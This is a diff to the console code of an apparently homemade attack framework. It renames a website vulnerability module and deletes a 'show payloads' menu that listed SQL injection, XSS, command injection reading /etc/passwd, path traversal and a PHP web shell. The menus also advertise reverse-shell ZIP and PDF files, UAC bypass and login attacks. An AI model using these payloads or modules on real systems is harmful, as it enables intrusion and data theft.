@@ -178,12 +178,12 @@ search <exploit | windows | site | cve-exploits>
 """ + color.red + """exploit/bypassuac-eventvwr""" + color.white + """           24/01/13 10:39       for execute the command with elevated privileges on the target.
 """ + color.red + """exploit/find-vulnerabilites-scan""" + color.white + """     24/01/14 09:24       for scanning target and finds vulnerabilite on target machine.
 """ + color.red + """exploit/XSS""" + color.white + """                          24/01/14 09:35       for alert the XSS attack in html file.
-""" + color.red + """exploit/find_vulnerabilites_website""" + color.white + """  24/01/14 11:40       for finding vulnerabilite in the target website.
+""" + color.red + """exploit/vuln-curl-website""" + color.white + """            24/01/14 11:40       for finding vulnerabilite in the target website.
 """ + color.red + """exploit/find-vulnerabilites-website2""" + color.white + """ 24/01/14 12:31       for finding vulnerabilite with payload you specified.
 """ + color.red + """exploit/ZIP-exploit""" + color.white + """                  24/01/16 01:49       for genrate a zip file, then send the zip file to your target website, when unziped, you geted reverse shell.
 """ + color.red + """exploit/PDF-exploit""" + color.white + """                  24/01/18 04:43       for genrate a pdf file, then send the pdf file to your target, when opened, you geted reverse shell.
 """ + color.red + """exploit/ssh-version""" + color.white + """                  24/01/18 08:32       for scan the ssh port 22, to scan it the port 22 is up or down if it is up shows the version to you.
-""" + color.red + """exploit/ftp-login-test""" + color.white + """              24/01/19 11:15       for login on port 21 or 20 ftp port.
+""" + color.red + """exploit/ftp-login-test""" + color.white + """               24/01/19 11:15       for login on port 21 or 20 ftp port.
 """ + color.red + """exploit/http-login-test""" + color.white + """              24/01/19 12:01       for login on port 80 http port.
 """ + color.red + """exploit/reverse-shell""" + color.white + """                24/01/20 01:12       for get a reverse shell by sending a link.
 """ + color.red + """exploit/handler/handler""" + color.white + """              24/01/22 02:34       for listen on the target to open the exploit2.php.
@@ -203,12 +203,12 @@ search <exploit | windows | site | cve-exploits>
 """ + color.red + """exploit/bypassuac-eventvwr""" + color.white + """           24/01/13 10:39       for execute the command with elevated privileges on the target.
 """ + color.red + """exploit/find-vulnerabilites-scan""" + color.white + """     24/01/14 09:24       for scanning target and finds vulnerabilite on target machine.
 """ + color.red + """exploit/XSS""" + color.white + """                          24/01/14 09:35       for alert the XSS attack in html file.
-""" + color.red + """exploit/find_vulnerabilites_website""" + color.white + """  24/01/14 11:40       for finding vulnerabilite in the target website.
+""" + color.red + """exploit/vuln-curl-website""" + color.white + """            24/01/14 11:40       for finding vulnerabilite in the target website.
 """ + color.red + """exploit/find-vulnerabilites-website2""" + color.white + """ 24/01/14 12:31       for finding vulnerabilite with payload you specified.
 """ + color.red + """exploit/ZIP-exploit""" + color.white + """                  24/01/16 01:49       for genrate a zip file, then send the zip file to your target website, when unziped, you geted reverse shell.
 """ + color.red + """exploit/PDF-exploit""" + color.white + """                  24/01/18 04:43       for genrate a pdf file, then send the pdf file to your target, when opened, you geted reverse shell.
 """ + color.red + """exploit/ssh-version""" + color.white + """                  24/01/18 08:32       for scan the ssh port 22, to scan it the port 22 is up or down if it is up shows the version to you.
-""" + color.red + """exploit/ftp-login-test""" + color.white + """              24/01/19 11:15       for login on port 21 or 20 ftp port.
+""" + color.red + """exploit/ftp-login-test""" + color.white + """               24/01/19 11:15       for login on port 21 or 20 ftp port.
 """ + color.red + """exploit/http-login-test""" + color.white + """              24/01/19 12:01       for login on port 80 http port.
 """ + color.red + """exploit/reverse-shell""" + color.white + """                24/01/20 01:12       for get a reverse shell by sending a link.
 """ + color.red + """exploit/handler/handler""" + color.white + """              24/01/22 02:34       for listen on the target to open the exploit2.php.
@@ -232,7 +232,7 @@ search <exploit | windows | site | cve-exploits>
         print("""
     Exploits                         When created?        Discrepstion 
 """ + color.red + """site/XSS""" + color.white + """                             24/01/14 09:35       for alert the XSS attack in html file.
-""" + color.red + """site/find_vulnerabilites_website""" + color.white + """     24/01/14 11:40       for finding vulnerabilite in the target website.
+""" + color.red + """site/vuln-curl-website""" + color.white + """               24/01/14 11:40       for finding vulnerabilite in the target website.
 """ + color.red + """site/find-vulnerabilites-website2""" + color.white + """    24/01/14 12:31       for finding vulnerabilite with payload you specified.
 """ + color.red + """site/http-login-test""" + color.white + """                 24/01/19 12:01       for login on port 80 http port.
 """ + color.red + """site/ZIP-exploit""" + color.white + """                     24/01/16 01:49       for genrate a zip file, then send the zip file to your target website, when unziped, you geted reverse shell.
@@ -303,10 +303,10 @@ search <exploit | windows | site | cve-exploits>
         time.sleep(0.5)
         exploitXSS()
         print("using exploit/XSS.")
-    elif scconsole == "use exploit/find_vulnerabilites_website":
+    elif scconsole == "use exploit/vuln-curl-website":
         time.sleep(0.5)
         exploitfindvulnerabiliteswebsite()
-        print("using exploit/find_vulnerabilites_website.")
+        print("using exploit/vuln-curl-website.")
     elif scconsole == "use exploit/find-vulnerabilites-website2":
         time.sleep(0.5)
         exploitfindvulnerabiliteswebsite2()
@@ -391,10 +391,10 @@ search <exploit | windows | site | cve-exploits>
         time.sleep(0.5)
         texploitDDDAttack()
         print("using site/DD_D_Attack.")
-    elif scconsole == "use site/find_vulnerabilites_website":
+    elif scconsole == "use site/vuln-curl-website":
         time.sleep(0.5)
         texploitfindvulnerabiliteswebsite()
-        print("using site/find_vulnerabilites_website.")
+        print("using site/vuln-curl-website.")
     elif scconsole == "use site/find-vulnerabilites-website2":
         time.sleep(0.5)
         texploitfindvulnerabiliteswebsite2()
@@ -666,7 +666,7 @@ you will specifiy these options when you run or exploit it!
         exit()
 
 def exploitfindvulnerabiliteswebsite():
-    scconsole9 = input("sc~" + color.red + "(exploit/find-vulnerabilites-website)" + color.white + ">")
+    scconsole9 = input("sc~" + color.red + "(exploit/vuln-curl-website)" + color.white + ">")
     if scconsole9 == "help":
         print("""
 help ---> to see this help menu.
@@ -676,7 +676,6 @@ exit ---> to exit from scconsole.
 run ---> to run the exploit you selected.
 exploit ---> to run the exploit you selected.
 show options ---> to see the options.
-show payloads ---> to see avalable payloads in sc-framework.
 """)
         exploitfindvulnerabiliteswebsite()
     elif scconsole9 == "clear":
@@ -686,40 +685,19 @@ show payloads ---> to see avalable payloads in sc-framework.
         print("""
 OPTIONS          | DISCREPTIONS
 -----------------|----------------------
-LHOST            | specifiy the target ip address.
-PAYLOAD          | specifiy the payload you want.
+LHOST            | specifiy the target url.
 
-please copy the payload you want by typing (show payloads)!
 you will specifiy these options when you run or exploit it!
 """)
         exploitfindvulnerabiliteswebsite()
-    elif scconsole9 == "show payloads":
-        print("""
-' OR 1=1--   ---> SQL Injection payload.
-
-' UNION SELECT NULL,NULL,NULL--  ---> SQL Injection union payload.
-
-<script>alert('XSS')</script>  ---> cross site XSS alert payload.
-
-<img src=x onerror=alert('XSS')>  ---> cross site XSS onerror payload.
-
-;whoami  ---> remote code execute whoami payload.
-
-;cat /etc/passwd  ---> remote code execute cat payload.
-
-../../../../etc/passwd  ---> directory traversal etc/passwd payload.
-
-<?php system($_GET['cmd']); ?>  ---> directory traversal php payload.
-""")
-        exploitfindvulnerabiliteswebsite()
     elif scconsole9 == "run":
-        os.system('python exploits/find_vulnerabilites_website.py')
+        os.system('python exploits/vuln-curl-website.py')
         exploitfindvulnerabiliteswebsite()
     elif scconsole9 == "exploit":
-        os.system('python exploits/find_vulnerabilites_website.py')
+        os.system('python exploits/vuln-curl-website.py')
         exploitfindvulnerabiliteswebsite()
     elif scconsole9 == "unuse":
-        print("unusing exploit/find_vulnerabilites_website.")
+        print("unusing exploit/vuln-curl-website.")
         time.sleep(0.5)
         Console()
     elif scconsole9 == "exit":
@@ -1354,7 +1332,7 @@ payload = <img src=x onerror=alert('XSS')>  ---> cross site XSS onerror payload.
         exit()
 
 def texploitfindvulnerabiliteswebsite():
-    scconsole25 = input("sc~" + color.red + "(site/find-vulnerabilites-website)" + color.white + ">")
+    scconsole25 = input("sc~" + color.red + "(site/vuln-curl-website)" + color.white + ">")
     if scconsole25 == "help":
         print("""
 help ---> to see this help menu.
@@ -1364,7 +1342,6 @@ exit ---> to exit from scconsole.
 run ---> to run the exploit you selected.
 exploit ---> to run the exploit you selected.
 show options ---> to see the options.
-show payloads ---> to see avalable payloads in sc-framework.
 """)
         texploitfindvulnerabiliteswebsite()
     elif scconsole25 == "clear":
@@ -1374,40 +1351,19 @@ show payloads ---> to see avalable payloads in sc-framework.
         print("""
 OPTIONS          | DISCREPTIONS
 -----------------|----------------------
-LHOST            | specifiy the target ip address.
-PAYLOAD          | specifiy the payload you want.
+LHOST            | specifiy the target url.
 
-please copy the payload you want by typing (show payloads)!
 you will specifiy these options when you run or exploit it!
 """)
         texploitfindvulnerabiliteswebsite()
-    elif scconsole25 == "show payloads":
-        print("""
-' OR 1=1--   ---> SQL Injection payload.
-
-' UNION SELECT NULL,NULL,NULL--  ---> SQL Injection union payload.
-
-<script>alert('XSS')</script>  ---> cross site XSS alert payload.
-
-<img src=x onerror=alert('XSS')>  ---> cross site XSS onerror payload.
-
-;whoami  ---> remote code execute whoami payload.
-
-;cat /etc/passwd  ---> remote code execute cat payload.
-
-../../../../etc/passwd  ---> directory traversal etc/passwd payload.
-
-<?php system($_GET['cmd']); ?>  ---> directory traversal php payload.
-""")
-        texploitfindvulnerabiliteswebsite()
     elif scconsole25 == "run":
-        os.system('python exploits/site/find_vulnerabilites_website.py')
+        os.system('python exploits/site/vuln-curl-website.py')
         texploitfindvulnerabiliteswebsite()
     elif scconsole25 == "exploit":
-        os.system('python exploits/site/find_vulnerabilites_website.py')
+        os.system('python exploits/site/vuln-curl-website.py')
         texploitfindvulnerabiliteswebsite()
     elif scconsole25 == "unuse":
-        print("unusing site/find_vulnerabilites_website.")
+        print("unusing site/vuln-curl-website.")
         time.sleep(0.5)
         Console()
     elif scconsole25 == "exit":
